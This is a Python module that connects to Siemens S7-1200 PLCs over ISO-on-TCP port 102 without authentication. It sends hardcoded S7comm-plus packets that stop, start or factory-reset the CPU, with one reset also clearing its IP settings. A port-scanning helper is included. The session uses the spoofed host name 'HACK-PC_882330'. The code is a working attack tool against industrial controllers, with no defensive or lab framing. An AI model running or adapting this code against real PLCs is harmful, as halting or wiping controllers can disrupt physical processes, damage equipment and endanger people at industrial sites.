#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Raw S7comm-plus style control channel for unprotected Siemens S7-1200 PLCs."""

from __future__ import annotations

import socket
import struct
import time
from enum import IntEnum
from typing import Optional


COTP_CONNECT_PACKET = bytes.fromhex(
    "030000231ee00000000100c1020600c20f53494d415449432d524f4f542d4553c0010a"
)
START_SESSION_PACKET = bytes.fromhex(
    "030000dd02f080720100ce31000004ca0000000100000120360000011d00040000000000"
    "a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333830"
    "a3822100152c313a3a3a362e303a3a5443502f4950202d3e20496e74656c285229205052"
    "4f2f31303030204d54204e2e2e2ea38228001500a38229001500a3822a00150e4841434b"
    "2d50435f323832333330a3822b000401a3822c001201c9c380a3822d001500a1000000d3"
    "817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a2000000"
    "0072010000"
)
START_CPU_PACKET = bytes.fromhex(
    "0300004302f0807202003431000004f20000000f0000038a340000003401907700080300"
    "0004e88969001200000000896a001300896b00040000000000000072020000"
)
STOP_CPU_PACKET = bytes.fromhex(
    "0300004302f0807202003431000004f20000000f000003a0340000003401907700080100"
    "0004e88969001200000000896a001300896b00040000000000000072020000"
)
RESET_CPU_PACKET = bytes.fromhex(
    "0300004302f0807202003431000004f200000092000003a43400000032019d2400080400"
    "0004e88969001200000000896a001300896b00040000000000000072020000"
)
RESET_CPU_AND_IP_PACKET = bytes.fromhex(
    "0300004302f0807202003431000004f2"
    "0000031f000003c83400000032019d24"
    "000803000004e8896900120000000089"
    "6a001300896b00040000000000000072"
    "020000"
)

DEFAULT_SESSION = "01c9c380"
DEFAULT_HOST_SESSION = "HACK-PC_882330"


class S7_1200Command(IntEnum):
    START = 0
    STOP = 1
    RESET = 2
    RESET_AND_IP = 3


_COMMAND_PAYLOADS = {
    S7_1200Command.START: START_CPU_PACKET,
    S7_1200Command.STOP: STOP_CPU_PACKET,
    S7_1200Command.RESET: RESET_CPU_PACKET,
    S7_1200Command.RESET_AND_IP: RESET_CPU_AND_IP_PACKET,
}


def is_s7_port_open(host: str, port: int = 102, timeout: float = 1.0) -> bool:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(float(timeout))
    try:
        return sock.connect_ex((host, int(port))) == 0
    except OSError:
        return False
    finally:
        try:
            sock.close()
        except OSError:
            pass


def build_start_session_packet(
    session: str = DEFAULT_SESSION,
    host_session: str = DEFAULT_HOST_SESSION,
) -> bytes:
    session_hex = str(session or DEFAULT_SESSION)
    host_name = str(host_session or DEFAULT_HOST_SESSION)
    packet = START_SESSION_PACKET[:165] + bytes.fromhex(session_hex) + START_SESSION_PACKET[169:]
    packet = packet[:65] + session_hex[1:].encode("ascii") + packet[72:140] + host_name.encode("ascii") + packet[154:]
    return packet


def patch_control_payload(payload: bytes, session_value: int, sequence: int = 2) -> bytes:
    session_bytes = struct.pack(">L", int(session_value))
    sequence_bytes = struct.pack(">H", int(sequence))
    return payload[:18] + sequence_bytes + session_bytes + payload[24:]


class S7_1200Client:
    """Best-effort S7-1200 CPU control for unprotected PLCs via raw ISO-on-TCP."""

    def __init__(
        self,
        host: str,
        port: int = 102,
        timeout: float = 5.0,
        session: str = DEFAULT_SESSION,
        host_session: str = DEFAULT_HOST_SESSION,
    ):
        self.host = host
        self.port = int(port)
        self.timeout = float(timeout)
        self.session = str(session or DEFAULT_SESSION)
        self.host_session = str(host_session or DEFAULT_HOST_SESSION)

    def _send_control(self, payload: bytes) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        try:
            sock.connect((self.host, self.port))
            sock.sendall(COTP_CONNECT_PACKET)
            time.sleep(0.2)
            sock.recv(1024)

            session_packet = build_start_session_packet(self.session, self.host_session)
            sock.sendall(session_packet)
            response = sock.recv(1024)
            if len(response) < 25:
                raise RuntimeError("S7-1200 session setup failed — response too short")

            session_value = 896 + struct.unpack(">B", response[24:25])[0]
            control_packet = patch_control_payload(payload, session_value)
            sock.sendall(control_packet)
            sock.recv(1024)
        finally:
            try:
                sock.close()
            except OSError:
                pass

    def send_command(self, command: S7_1200Command | int) -> None:
        cmd = S7_1200Command(int(command))
        payload = _COMMAND_PAYLOADS.get(cmd)
        if payload is None:
            raise ValueError(f"unsupported S7-1200 command: {command}")
        self._send_control(payload)

    def run_command(self, command: S7_1200Command | int, pause: float = 0.5) -> None:
        cmd = S7_1200Command(int(command))
        if cmd == S7_1200Command.START:
            self.send_command(S7_1200Command.START)
            return
        if cmd == S7_1200Command.STOP:
            self.send_command(S7_1200Command.STOP)
            return
        if cmd == S7_1200Command.RESET:
            self.send_command(S7_1200Command.STOP)
            time.sleep(float(pause))
            self.send_command(S7_1200Command.RESET)
            return
        if cmd == S7_1200Command.RESET_AND_IP:
            self.send_command(S7_1200Command.STOP)
            time.sleep(float(pause))
            self.send_command(S7_1200Command.RESET_AND_IP)
            return
        raise ValueError(f"unsupported S7-1200 command: {command}")
